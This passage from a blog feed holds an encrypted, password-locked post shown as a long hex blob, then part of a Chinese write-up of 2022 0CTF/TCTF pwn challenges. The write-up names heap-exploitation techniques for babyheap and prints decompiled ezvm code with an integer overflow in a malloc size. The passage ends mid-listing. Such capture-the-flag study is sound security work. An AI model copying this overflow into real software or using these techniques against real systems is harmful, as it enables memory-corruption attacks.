f5a356fb6b5bffccaa60b2de45f74798f9f0078d0f219f5820ebee02fb2e556e11ef1185452d3c04bd3bb8a14f4619660fa113069efaf90853f17310873aa770fbc686988ee1a7adeeb43ab20a0b80addba15ea0ebad2e5864390a18a002a2f7779a5d33b1ac2c44abc04a3e0da0ecb3b37aeb0a8cfd454709bc05e45bd4e9f246444dadd3dada5a30f5c60453169dac6c5ab6b18049e142397187894720e470c4b6eb7cbe52493b1c8bbfbe3ac32b1a2a0ad5e3c26bab850bff971fa3e9defffd595812b7deec9d44a7992941e8ff38147601dd08e620eafc0fc6c3c74b0cf29dc4e803d6c7599755fff070d4583b7e442d3520dc47aa84a6123075e5901246e57f22d74cd09c588d894a85d541170f00da44b5eacc3c6c3b5d940cb50fd9ce845906e725c993027dd9fa0142dee05202eba7f0678721da8bc72b6517e003b147de455585522a6f932dfd36592fb6edcf147d5efcd0654e38646915241e53a1f6879b129922280ce9a460a6c3722e0dc15d7c3b410a67734abde61ea63076f2f129142d47ec9ab59db44e97d1fb383172ae402396f99f7532311d2b83cf6fb6c060f4d737c3b97e0a81b062a1c2bd7a704046ad563ed0527851583863bdd51c36b193f8f507d098b0d76f13bd7976559d641366cbf0fa86ea47d447f05e4d3c4b56aa26f010fbc3d0483e7e7b84ccd359856da725ebd67ad450f96e741859b7a730f084d89e13ab882c8173b35a922cd1b19ba09511eda07cd68783d24a06c751df20959e6266edcf4a704470e950cbc3e97eb50df3dfe56536813e20acf606210461410256615e4baf33344f461c36f4914067973b77ea92d8a85d60e17c260f7f090e464ffd0b2604aca9871b3e837962e5ea3ff369feb1e47e79a7a777de473919989af337f0fcb9e81e52d2ab4b1edcacea348884ed219b64dc2177bf3646084562260cf37a5d543f290306250163a1eec4f5c6cef40fcaef96e91d1c7c024f21ac5179fb0f74e9834bb91fae4cfb73e0660ad8a92d652e18853d432f35bfdcf9c99ea636a371efdf4914580f3fbec3a12c6a4d2e719410b7f0e0acf8e7053aeef2175c25c4be34d2f49fea6bc5d803299c334bed88f400731e9ae105111a72b4d8f06a93631247b6b8eb039612d8ca79f5cc486ce6b0d4108812bda977abe37935d4fc3bfa217aef0d0541289713bea1e34cb99d2699a253f7f7814ff1f5bdb983cdcad849fd9954b7c8f00ebc08a7a66d11b14b44d8335579e4f5181acb32ecaa0b58e3745afe525b26a00b34a7bb0e7a1b85ea94de3953ed59985ff7a9133fe5e7aac4fcc487efaee85e9cba37b12e60662ccf88b5f3fdfcc3e93ed09b0c196b21772407802b9cbd0360397f941be88ae4e97643e70404bd4ea030f509435503d7ef8aee85d71af9c6c66db4e4d336bf5fb709dfa98b8a0c2943705cb4ce87e5705f5c52b31562f7261899c4f180e3ffe8065eb0ef92eb954e6fd378479eca80add0383e4f0c5d546e7dc5e4f2e846aadb0a446d99e1812ab55cef265652d9fea2e943a098416adf6a0022721afec14b166bf0377172f18c4cb14be99d0fb03f49320edf80bb4fb11fd3c65c925b475a8e443b7cc62bdb812a30b2c84a9dd59fcf061c07e09ace74c6e65a99d152d8d765b097576f66f9d55eeebbd79e5702116960dd824bd5a1977137e304d3cffbed4fc95f3eb91a06810ee47ec48519db0e7e9e2a8d599f4485d7ed18cdd6f5b398b79e0e10a29eda2e28a0bdeabe507413369ebe7c0d126e79235121ef2eca17d13a6e1e93753b824fd8cabc07c64ebcd226ce11d2ee666c80c81323767d791fbfbdd6419040d5c8314ee18327f605ea641a84ecba4c43390447984d63b08bab934048be47cc28d17ed3b084864094b1af25e3e524da9f960a8b7e774a4ce9e46c092d15432fae679d28eb11848c0e7eff837925c9d3248172c33bea9378de4e7e8419f9433a1e2c57a0f74818bdd149b975ee3b808ef981c5fed02007d7f18e887c9933f5f6c5f301560f3f6131d153ee7db947097ab0b1cdda8212b9081cb301816ea259aa8c3ecdccfa1fccdd1e71ca76d41b9f2b3cd52821200ddae29a176f7e463597e9470961b860dee9dee46ae9a1e4e5f02d80ca579c83c2b1abae3b5b36665349fb0b0644246067e05d40f64da5f847840ad109cf01a7b41e1e26ae7086fa48a37a73e8b3b0910e04fb48e35c0c55d44019d2987f1ad24fd141019b87ba62d3e9d6c5618338a4f7442b04bcae2a7e0b40d1833e8e44d3b249dd8ac9f343f99508c306cf4aa89ce1d3dac41cc6b451110831157fdd2b40224973c784327adc018788f00021c033ef722fd577c4c9aaf83e0d15eeab4732ed732567e40a751e4846cd45c012262585737edb22a3ded832bada2d5c94de9444cab9c6261a65626d73c22ac45c0cdee101a194333a3d2f83fd76c9367536b70b7a7cf4fa5b6b619d8ed3e172951d725653c249a91acd0f0ed49c86b70029496d31ff5a28405c44bc7ca09b6a8918c95990ab6b3cd9674bae45c46a46e4d4ade2054162c54029b11364f41f64cca99e24718a887910629237f6e8c5e0fa152ac70e7140a2f53e0d8f319d16e1f089849548911317771fb97968c938e3d36ee2d4581a16e8dcb3877f7e11b9aa7e71cf19a45844cd0e1a76ad81931909c6270fb8c28b29fc4edd639b6b9c63b60327bf56eb72393cf9d1d1031429493d3eb9b2cc435c75aaf47833d75df607f74c18a88dcb648e6d0fcf35f26f5bdd1559a1f8377e065b3251592b1c79dbcdbd1f7c5b8c0431535b1e9377f8beecba23146e9555861163b4089c4ff12e86b6e992ae2792e09a6bd6c389596080c128dc1cf316446c368c449b143ebeac8533afacf81752d8fac6b89a26f3364c88823c045b2583a186bad547ee9e7adf948feb6dde48fb9be54cef6d42fdf9474397e4378f381e91bf30ac14dce8de1e070107e91c08b7ebbb691bb655869f0504a7b69ae1c6363785440d40459fc52f07de457f988a4e24efc00138f41ddd37e9ead1817910a29a15cf086d8dd980f72ae3a4853ea6ae54f76113991293e2ba87bd5d0992c7ea53bbce6829e31ec2da286746613cae9062150f6e6606fac556d77b8002f5c338a3debdb90b286ed2191ad89e3d50a78cb7946e793212af51af6a2f4baed6d87bc4f1709ff1a20c8e79416fcaedc3e3ad893f5bc6c5599e5078500697945cb80af9f784344f501d79ff4641cf0183a1db21c6a57199b5d370fa14ce406bac5b257ce3eebd513f1654fe6e418506728e37bd3be68a53dc14b89c8d0648c588aa3374a39496717cb23e429de3388da5908e53ea1727d066a972181711b29a7ae6e81a90e37c358924f73dc8c78ba930e5e420012ab9b56f1612a1ece251ee8a1c7c1b75e00c7245c1227cb479e8a9ab86869957f0d56f950228cb5f1849e71861f47f965e67969ce16ec5b6cfb7506c102bcabf522dcf345c03fdff542b8cb2991d86ab97d7118d5e10728f07c117629c7a4043cb3325bd0c559d31b8104c36143b1f41a2e8fb47656f20736394aa5f899651239f8fca46ac453fca62ffb270a79aa9225d525b32359015e97df7c0337a87a377ad69ba119ba4aa570993934189665f8613b91244a57371e49c6d30f09f297f5b01c76b1082fbe80c6da577e2eff0a380be3fa52b72a94f1382d08d0a4a5dedf350db3155da12878448c7471f2551ee3487a6ed81d24bf13af5db037e7b2512a689fe3a7d73e58a406f5958b7df4dfe97d2f3c8c676c4cf88e7b6abc0345242315f2c156b5e69a8f5a2e4db9c478aea958182a4278524c81d52d4ef9a20ddd28afab23180385dab6048cbad996aa92e09ff5b1f8040065a7a838a12079c8e75b34804553b79b4ee044305afb872f5d9b4437d7963b8115eb87d421cba2cea7567cdc2e475d67c3c6607012f25db61ccc951687f9dc5190d94a3d13057ed0e5e4345470235ebb2fa6d371f338d67b9c80a6ab610876f1bd040e745929f5fa66a5ecd17367bc7dd2397267f0cddb52a6dd67afdb54536ee301db4a3b27ff47961cd75a75a46518ac89ddc60ad8c7860496e2dd8834674ca7b08cb4a1dbc9fa385985c5510d149aa2bc27654ae5f7db15099f07b70fcc618301d61ee6c79e9744574c28a4fa8750939dbf046b65e8d0f3395b49cb5e9bc227bda6b9e4ce09199d48b32c5faee276198ada2c4f6806c17026ea6d50506f1019d67a14dac6f8dc85b711a5318083478c6d32a6848ea9cc1d34076cdcb8abfb001e49af0e73e7c3d60be8e6c413f483763be6b942351d3c1ab8f5c29c93204e374c72a0f773e574e3d6420649069aac2788cd433aafee0b520f99cfcdc834fcdb12e7022f7077c49b60b57f131355d9835603404261bb95b00358b22fd2d323b594bfce6cd36d5fc4110bd42db3f9a101ca0d0dbc4c835f817abc17972886cdf7944c0ebce2e44434506cc3c794a486e601588beb3b6d6abf259fde351258bfe53ceaf6cdad6a7baadcc68a102a3ba79edd6bff5ec85eb4dc16b0504b803c2037ea616b20817a19978eb350ab82b02faccc32900cf909ea6417a4da662951c36579bc0783b9f1b7440f3695c019180527f712293f0f788145f7935a94a5a1d93dd5352ee1da1a6cf66fa3aca38fde7831fae9e1f82fc14612fd1e7692ae8a012df577ee0880ccdac7197bb5f31735c31c162435cc22b10b48f5c92f0a85d878bd8f664a590690386da625573dd4facedd7e22e38f26fa277f2dfa45192969d75083e3dccd4195b2cf2e8409487d6e51d9e3e36e528396407846f5b2114ad356db83bf9c0fa3d6c41db73af034f221fc60b4d8c37feeda38e37be42b20d689fa5f04fa434fdc47e4eed5f3fab62c4304926f6d892f6f5c6edcab556777cb4b31c847914a886be2d3c56478d53d10e5d0431593fb031aa4d48b3ca983d3e5d2ace1cba76e664a1b17fd3ec3ec6c0d25240fafd2c3043de015e34ec0fd7d69b774a0e7f38f33fc352a7bfe9f70f120aebbf7511b296dd16d1bf82ed45530dfd47187efc7f8e6bc1ee21f3982c86efcacff66c875a64937add118d3c11b16e237ece8848a74eb03a192ba8bdebfc2306d1f3273cd3b80fec851285a10b7284aae2397816e3ff4ee811dc29bb2d5a4f25658b565991fc6aef1f314042546b9e22fdec085cfeddba6fc91db63fbb336f8a3ca9eebd7a12250e6492d5f181e28c410b1b39d77c6e290ab0bcfd489ec7af0c0050368ae64a08c821feb98fc5769ff521262d482ed1977d5cd0e8b244d84bfb9fb65178fdb800a8e5bfaa448eb2f3ae97e91bc7ca635a6cf0b2352c31701de792fb421d08ec924d6e6235ee083f9f29778d26754d886f7144b04eb54f07820a01150300be825eb19ec287f83b23751b545e4b676f12db599d703cb68e42d02b8695ac9ccc557944a5450b464752026035bd6eabdb3c28d56fdf9ca3981f00b698ceadb66c2ce1204d53a53fd31234dcbc2200975a32ddba41a2e0733945b48cd1325919b3bb2e4d0b395721b8019da07e27dfc7276707a670dd828a591286b6caf7b86d3ff5c81359d27cadbf9d07abe489b0912a434746fe6ffbb0dbc89dcb8d96305e03c7ad791984d822850c6537bbdff99391570feb5e331fed46c0c68f8390a3701cf1f930ce7afdc00e2fe6d8bff3aca158b058c7cdd8fdaa37b7ea077ea1b06d4b2b63b000cf061410058e553559c77b656a07e87484de101690e94aaecdce7347a1122ceac88ae8989a3eeea5cf072350ef1434acc25012c4c6c5d8aa479b0ffc4fb4ff0292c5f34da21762e7dc70d71e60c6974e95cb3e604103cc7fa209f8aeaf7b36545d413e414818e6cd85e3db26177b38ded585461a54fac6de8fa15ed59eea1eb7b0e28a177fe04fe9a005310448fdd5e1dc052ab7482b00f157d6b79e624716d99aecb6e72aa0977e91b4e823678c6daeda24842e82e7c4f2a19a28c83e8e2b19052d1c8a826cfae4c16a1a66a22345579be13ea842f1ed3c6c7f9cce60437568438324c2c8de83402dd921523b4ecc51f086af0d66d093b86830a5658ca80297f026db35b267e12e1bf232d6dc1da27680c21320f25e7cdc3244f4623c60ffb1c0ea45af7a60a9b983b389f4ea116371ffb46ec22c1e6005ca6fd8058d9093c8e23b3e3ec28afd7e33d7d5ecd251b6e4f84084fd2b5376030f7fca06a6c7455bc4175dc89f29ed486c290381d7097f323ca532fcead775b82e86dcc603bd99fe70d3f7984fcd9f0bfb3db553ca25fbc92198895633277fa9c78bbea4123e37a76c157f1721aa4c270b80c7d4d93c18c674c169ff8c53dfaa4b49b3c196f3108fb01957f08e5b9c3f07a211fe9fc7940f521f0521ed0e7f8403b138ae73ecbbb0f0fa1450ac914ac5b0317d6ede7d841dd411e96848f292225ccdb3be9b01b8b29746a7f1d0692d7637775438d6a6ae6c06b19d0d9f10521feb2d6021d5f2f0f49fd3752db38a5f676377b85b5004eaefe8bb2c721e2e9f5020d3e91af30eb450d1272e0c9b67a2516b7b58ad3eb56579dbe2c8f05103baff5f08524c181dcdf0cac159a578ce21958a5bdb5879e3f2098576afde48a581abc0f0473d37e8e9f95b5e73ceb34172647e62e8df39bb3e82a462663f6317f42f76035e01afdfb4e3baf52b80c61b2eca134bea9643d17a3ac813f25ca4e77f2c342d6f421edc9a859bb53298bce24919cb5bd30309190f98498df512fadf49bf9b29556a97198489d9bf6b9c08632521175d54be74f3532b430972f9cc0b04d16c2f195b187813df666e22901e85cb021e687d88ee3495027ef6f9c709d3bc4daa7cc27de2ba5ddb2285f600f495257d8e7b9696a2c596bbb6a0bb289f5a819a99b8bf369146cb967d9b062b02bb4f859f40aaf3761a5e7646f0cc9882d15d997c655928df9f8635663b4de627fce3bd90e25b911200d9a323fb64781102a7b8f61818f1998f00b4c23e857bd14b58cac38e3858b012c6c18319e90bd2c7521499de1e0c8fcb45f71c3d0eeaecef16eff6a9270d7274e6119e3240b6f6dd915c4c8a03c410f72ca6f2775ceb62801bff0705e9a95e878d23626b874cf7b05812670a7bc9fef45d8cd92680b37c76a7a8cae96253cb42e8c67cfeec0de71381586b2280cf2f6c1a1941aaabf69a3ddb29a880f30e56a3a67bde47ecbb9000a4120042b6abd996c0c2c10d0d2be959ca06bb7d3f93227c8447c5b174f5ec35d9dda3b7108d201e2d1b30103dab7666e31a5edbb4f1df038da0bb72f0def0ccbea65ef1d745fdb7fb0b3b67efff40b047bb8123c5802edf0a59d8609c03605fc83c3d05b9c0251724fd4a717f884956d6ff6e20616a581ccf112989d341593a0a7afe098f6e36c1b2e54edf2898710c0ac1e7d82086e952a34439215d9274bda7d5a191da8e6701c4aea0ad0df5344b1cceb196e7444a373c362db266a33c6252dff3229baa6f76f898b92da51a1b764ee51594fc79979d2554d6ef7863c2a53c64c2fdb17f760d959d0c3bcb0602c815ff38e2cf3e6fd6b3ed38ec89e235ee5d87a082c1cf6a4cd6d43cbec61cda5644c0c7ac5389f3a8c4eaa67002f19179f4ff81e70579d73d123ef2ecb1cc24e55e65ba95e74d4908f691f29832498486747ac935a1af71207146451503631de3e90864b75acea9adcf268e15485487d38ed6a7250f31b091057421508c2031dbc3192396c6add21d86c589923c6cba6f9b8cd17bea6e99e73ff3dd840ccf4a3f406dcb2533b7f768c0ce95dc590203ad72bb77633fa8c3825923e8083de5b9c37d7baafe6d078af9321ff5ef9203d84fadb12f0d920e3b06cb2eacb01681bc26a6f845e3784032ff0b2f72217a223cd2efb8f3bc45d64f126050727e7790e5f415e2bb49ad7706dd1dc9ffc949981f1dcf1ce0c4595037e06ea9cda7b89339f69eaf95b49fdf4ff9740154ba384d98e0c3a9d54c050709912c930b46b511e475c6206cdc695781b42a04b2d4a45d699ae33adaa302ca2c79eeff4bef1399df40ea019b9e9cd3a0335b824cdb599588e0f30d6ffe5a35956c3212498edbf65c16399562039301080cc1e6c85999e58603f27325b6f6f8499776ab3e39eb18971e7059bc209dcc447501e3992fd8916e9f91531b8a6407c1b2f3a9b2ddc7dd9a45ad3db71dc7e13b861509203dc3c2cc6e6995fbf953a8b4b542195c8d91f52634152dd31f27ac8178f2af7bb717805b82c69bf1f93d4c91cd6eae118e20474043b031134bb4a0d12a09911a99548d2a9805550ab0096cdedc6a042dc4b94f4c6150e2a77538c922e8c68fa3320e971cd28e4de5e384b1db47169c189f89672ff93813f71595011e5d1b77acb7d96adca41d88d59f69f67ce839e849700874a35ebeb5251afbb54b3efe9d92b8a0a68a5891315068e31326f078a7a626ba7adc0aeb45af44d84adf4c0ecfa47c7491886c1474026ead71c44ff525a68d5bbfd4a2cf0e4f8b49b4b915d1f96cb48a1ea9f74b2daabf8cb14b52627116f36b2ca2803eede736e23a95bd0e0e11a28e0cbb3abd99f83ea67b94a4c15d37ea211c2fbcd35c3bc41924e035274a73de0081dca4cbe44bee03141e7e1d87061cd0d6dca7d42677e912c9ed09714b2ef2fdc06f39cb9714098a1fec80ae84d367f8f5839078e4795ff5aaf39b051d6763dbb8174a1090af79896f24ba69c382d5f42f6eb78c7aafed9b7b9fb3de16419325e263c0de54e1dbe0ac26b75909b7fcea7379dc2978625841d647bbfabedb4fbd3810d7840c8a138f77768793d5323f2958651c629f8bb148366d2428c8018b8895bcd39daa6cdc90f14afdfc5434a09e4d288ce4cbb45aa5528456c02a72414ecbe334f71188dcb2ffca919553e008b132f7a7c7de03f6f5b9af5a7f5e691a11933f6e6798b5c76239fd9e6192632facffa2171f7a300fa7bd36a8f53fa5a9946955fbebbb4995e7045a4ccb4066e2b1aac0a8a84bc6d055f3c6b645af35fd1eddf1cecdecd6acf2d7ffab46b682c65afb93a2fd7f84e75e0d1e1aece44e6c35123fd184c619c4abdf2287267ea89ddf4bea6679a947cbf04e11017ff5062ea0539d4c79d10b2a4754355f026829124fa6899b6eede4da813b8969c658e6cc23c1528d42bba4bb829e9be514eb033a6cf5f4ebc82b1cc6a1bfd6d7651ba7911edf6525775edafd55b27fb25767a25f982cf8da325a12c611f3091fd874108abe85eebe8fc157ad3292414bb20b9aeb3f95d7b2ac561cfd934a247013bbbd1d1230f675f436b02ed2d8ddb8fdbf34896cda71c94b7cc49b832fd104bef815da628bca63c0621955731b4ee273acb64d7fab509e835f2e248d1179f4169a810f1b00357cfa04bb975599d2efb87916ee6a0aff4ed52df86da028d393bc8af641cd4460e981ecb108e4520bfe3d62d8c23f0e75c0234192e48d4e77a640837edb2d4f00854f9beb2db67e9de95548876270020c6e8a0be88762ac9e8825a5d7b181d5c61d965e5855adc766a7bf0a6b1bef9a52492f184e67dcf83883d4f61e65e4dd9f569fb672e20cd94008c8a5f729c7f850e4ee3e9e31ec5850fc67e8b794181f50f275356b2b86690b91146d5bbcce8658360cfa08225b32acc70c8ceab4bb06d770b8d94b19e68feeef32740bf590b2f039fcf797d203088f5ed0b84f8acdcf5da0bac6f1b011d8ec08500894c506923c08649ebc26a1804f47d3958c826f3cf886ab283fcb7695877d46821d4ad5f01da0df4a3c8a2c286a3307acc89600cad6ad4dd1b3c946c8198c80b05a2ce5f126756b6cc1d0fc9ee6cae0ee35c44bbd2ec9ba86483fd711b454de5a127a02587614c668d0a4292456eebcfb46626cfad82aa3c9cf9fe6ad1f126d08d16067df0b98500b7c582329e54d303a697ae19ccecd669a833b17d4b31c041480c5aa7b439ff772fefb2111e7d4f8322b2c8ce351e7eb054918e26399cdedb1f1dacae2ecd919e6d51c0c81662774f092355b5fdc7e78c8c9e23f0991a98da62bbfe5eceda6b0ced245d2548f17e37ea3027a527f22ce96ba2726766ea05543b536350569b17c387b22298e2eb628e7d6e4cc17a9e698904f24b9c914596d3a8091b45cef9bd3facbc68779ed787da3ce1c692c414b0e83a81ea525a9cae56f6cc26ea37461ea02ed7c47e289449a59197bc72b360d7dbbe60e8d71ec402d758ca2b50ae398efaf188b6d531fafd18f8fa7195b15f31d01740a729c06b3b1f03c53e846c586d2b417de6627c202f5fdb3ef87365466d09f27497918d49930c1f43949825e8c81dfda709f3ce231645d629cb9421a8769a89d56b8347a24b24a62ed2bdc5a46e83d18cf08e5482e592614db86d16eba8a45885c6e670655784716d745493ae3da6a64f926fe33b5fed3feec532a95cf95a32a7967e68e6d5c0537c3420c9296b7b0f99411a0e08ec2a396cf0efe68e3e6fe8a10f47b33928c44e64c26f0d49d687ca7aa9c044b9ab84cf227329ab17fcbb05493487b0e2b0467c4ec0933b8bd93bf3ad4eaad6c5299f9fe934b56deb64b221b3e2fc127c7c33698ee9a109cce2c94ccc1a45dddf37fc7022eafb03d5ef52bae64dfe4ea3572add52e193d072edf7e112c8da38582c6abbaa31a558e735f80721d7a21251e0bb1e9c193a252e47dee64b0f8f52dffcf1986f7baac6189182359fc6585ebd990650066e2326ce83698a0623f7d3d557db6f31b01b29f723f917cd1c999637798ec919338f4b735cd42618f60504553e4a2bcc9be25720b4955e7c6cd8d8abe4dc7afe781f13a55e933fdbd42f3c80f93e83c54cf684958ed8bcb734ccc28824d0131e372202ad80c7cbc206a74755c6b796be39ac9ee7a840eeaf1a1366ea0bb9087c6dcf2d03f19daf7b2721a3be864b3189a3eda41b65867e97881f2a7a472a3d3c50818c3cb9e5cfebb567f747d24a31302fecf02ff28d31a18a395f324c1dab1ae4fb33861ca2e44e789d42182d5a92b7af662afce965d086821c4b2a343d745d442405a2e11fea0b68d325f36f198b627d9e72571e3cfa4b64d21bfd163dee078b8c6cd8b4405c55f76b95af8cb742492efad5da10b2e1889c1da33afdda12844289ff689f3604457f3e968c7bc7b09b2b74e5414b87c1eb895268053966ed0c88bc9d2905fdccdb799c038f59f0eefea524cf80e1f237491b97c9b12e780798671be8bfc240cbb67fe84a18e07384e4eef94e98c09d0358da514d7a5d5841899991e2b4eafa68842fdf863e65cff554c89777e5494ae503c42e6efed6b1ed73b09fbbe15333424bf9c51ab731987d39439a6983a232b808fccb64e54f7888f355a499c85fbcde8a910705ab6a42a62e34076f44252bdff8e69d494c68ba1a0b845838771f87f7620cfa8af9fdd4e50eae263d839963825e1a2743eb38e68123047be7c93a8e5a763c0dd638ebebe823dd55cb389d0b7517094201322d367cfdd97e3709b323877c7569d4c72596e59edc8a18091ab3b6ff1685f52306ae25f0dfb52183bc1317c9dadae0abc7604d1cd53acb272f81239e594c9c52680fe3a9f4e0e07d21156223af4543ed859d040f28702d1d2c0e3f76881859d6e288d24892d8af307d3593f208e9f6eb8c3d925c19ac2cf1df9dc80946b71df8644188212243cd3532788fc248313e61d46fd85cdfd4c9afa37c31aadea844aca6bb4f2a3d6386e26864715a51296e72e77920e8f91b3618b40be2e306dbea5c68dfc65306ea46ee8cced4e379b3c8d888fe6839f8b19303ffc9908d40ac51d68f75a4ea71dc5ed94242f45d08d2e867519f09e8b34ae78e7f289e275abd33d79e489b2b17a9e7f68ac606f1b1550b0df15ea9a54d5200e8748736c7d6e06d98c6107442eedc4874a42c76d953f04df36acdea96b83f43df5c7e79349bfe8257994d0f792202c9bf0b17d3daf1a2b17772c4dfbdc8b6606713715d54018ad386225b99ac7e232ff60e4161d5cdd1f61c138c13b93f151b7c176409fc26bdf1077b7f6eb31d51ed709959620e411da0cdc37578d703b7361d249fdcec0f6a4014f98933f6c788195b7b795812c83996525956fb840bfd4eb2b4dd0ca1b9616df88369939f520ab9789c789cd9a3390b5a92bdc7e3ae5e5126b959d5b7fc3e7942c659e306408a243e07264ad1f3544971ecd9e1e2a28bba442d78e122c3a319f93c2c40b19d78c65b15c3a00d52a6432473a351dea85af4c516d3cdf20547941798b495f7f872062ef38441cc1fbefb91f9f5552b8ca47e13f43ce1f1fead928051863f257985e34e8ce9b80f84a1dda9f00bba145adc08cf0a3b786902db73397ec105c64be426328203428a6c19914e67cd3a2030f5c32468b9e3fba9478f4dd5202922f48ef7602b6e345d39762233aff87565e552bbb82cb0d454d54d71e1a9d67881ae71ecfa993d087e3afc38abb85975020434b87dbadbc3a8b3dddc3117c3f853833e8ab669fddbbf606d415bc2142f8db65087889ee0f200a22179a21bb46aac1a27f460706b3bc40350fe26e69e87a2778be54f7991e91e8d72e1e3c0f06333a510dd9e2ca913d535054ce770845bebfc4e5350c1cc409f907395079c92ed19bef3390b6f528ed795f9da32034ff08b2f83e495788e2ccadc5c034e6b86bbd2f474a614ee5069fac50ee9aced84b9e57e625da79c062240be91bbd1709713bdd96a708a82a1433167ee0813c7bccd66a5d51254720bfac1fa5120aa8e888fd3beae2ab49a2b1a434d74c66f81ab7d0e967dcb09aad0d6f8018bff33eda2e1313219794c35ca04bf84d84d40d2842e4921b56a7068fffff0b44642c3ab8ff9c169e694685086c92901ecab3c81ade00c902d59eb46659b8615b29bc33297ae3d182f4a90d4c076fedd8cdd994b431f0986967b834d387f33cacb1d47cff496fc414c2bfd2253a34962b2e85a1f928b40d66a295454a485b99f54a080f831c3cbfdb2615de71640748024fa41c3b3e847d5b8bb3c6698cda4bdd39b25c1e48f604eac3ec2d79d0bd3873735586a19bcc61327259ac442645fe93d938cef7815abe976a66768acdfd6823f7b756e1eee53ddf67e6e0ff8c9e764e20e05424b5695e6fa0ab155a98846ba0586f8bb30273604e28bf2ea545cb5788904dcaff0be0bca2b9b579e4af61fb6d453bdf3c60a7843baf0be5cb3f2b656b171f9ff4a9764220acc96dfff53cebfb9a24f167b90681e48c6ba6c0578e46718503fa9682b0b45919adffb6a00be63da81a0702b56c71f57535c7a972c122f2d64ecad679f35ed86efe8c0f33e47abe29f21fdfb075b828739a1e08d0da</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">没写完呀XD，暂时不好意思放出来</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2022 0CTF/TCTF 部分赛题解与复现</title>
    <link href="/posts/ca1d58fb.html"/>
    <url>/posts/ca1d58fb.html</url>
    
    <content type="html"><![CDATA[<p>glibc 小小做题家，什么时候才能和大师傅们一样审源码秒题呜呜呜 ( ᗜ ˰ ᗜ )</p><p>我在比赛中只做出了 BabyHeap 和 ezvm，其他题还在复现。</p><h2 id="babyheap2022（35-Solved）"><a class="header-anchor" href="#babyheap2022（35-Solved）">¶</a>babyheap2022（35 Solved）</h2><p>2.35 的堆溢出，洒洒水啦。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220920122906462.png" alt="babyheap2022"></p><h3 id="题目描述"><a class="header-anchor" href="#题目描述">¶</a>题目描述</h3><p>Hooks are wiped.</p><p>Pointers are mangled.</p><p>Skills are to be replenished.</p><p><a href="https://drive.google.com/file/d/1iC36vnQ8DgE7dTV7jinWOU4SiG-W4mVp/view?usp=sharing">babyheap</a></p><p>Update: The file is updated to include the running environment.</p><h3 id="思路"><a class="header-anchor" href="#思路">¶</a>思路</h3><p>一次打 fskey，一次打 tls_dtor_list，比较简单，不放 exp 了=.=</p><p>可以看看 <a href="https://ctftime.org/event/1717/tasks/">ctftime</a> 上其他师傅写的。</p><h2 id="ezvm-29-Solved"><a class="header-anchor" href="#ezvm-29-Solved">¶</a>ezvm(29 Solved)</h2><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220920121121665.png" alt="ezvm"></p><h3 id="题目描述-v2"><a class="header-anchor" href="#题目描述-v2">¶</a>题目描述</h3><p>Enjoy a game with virtual machine!</p><p><a href="https://drive.google.com/file/d/1zJzZSx_fCxgTnOXwaDpsmtztBSohXkFU/view?usp=sharing">attachment</a></p><h3 id="题目分析"><a class="header-anchor" href="#题目分析">¶</a>题目分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">do_things</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 size; <span class="hljs-comment">// [rsp+8h] [rbp-28h]</span><br>  <span class="hljs-type">void</span> *a1; <span class="hljs-comment">// [rsp+10h] [rbp-20h]</span><br>  <span class="hljs-type">unsigned</span> __int64 a4; <span class="hljs-comment">// [rsp+18h] [rbp-18h]</span><br>  <span class="hljs-type">void</span> *a2; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br><br>  write_n(<span class="hljs-string">&quot;Please input your code size:&quot;</span>);<br>  size = try_LONG();<br>  <span class="hljs-keyword">if</span> ( size &gt;= <span class="hljs-number">0x200</span> )<br>    Error(<span class="hljs-string">&quot;too much!&quot;</span>);<br>  a1 = <span class="hljs-built_in">malloc</span>(size);<br>  <span class="hljs-keyword">if</span> ( !a1 )<br>    Error(<span class="hljs-string">&quot;malloc failed!&quot;</span>);<br>  write_n(<span class="hljs-string">&quot;Please input your memory count:&quot;</span>);<br>  a4 = try_LONG();<br>  <span class="hljs-keyword">if</span> ( a4 &gt;= <span class="hljs-number">0x200000000000000</span>LL )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( !only_chance )<br>      Error(<span class="hljs-string">&quot;bye bye! bad hacker!&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;OK, only one chance.&quot;</span>);<br>    only_chance = <span class="hljs-number">0</span>;<br>  &#125;<br>  a2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span> * a4);                          <span class="hljs-comment">// overflow</span><br>  <span class="hljs-keyword">if</span> ( !a2 )<br>    Error(<span class="hljs-string">&quot;malloc failed!&quot;</span>);<br>  write_n(<span class="hljs-string">&quot;Please input your code:&quot;</span>);<br>  read_n((__int64)a1, size);<br>  vm_init(a1, a2, size, a4);<br>  vm_run();<br>  vm_free();<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 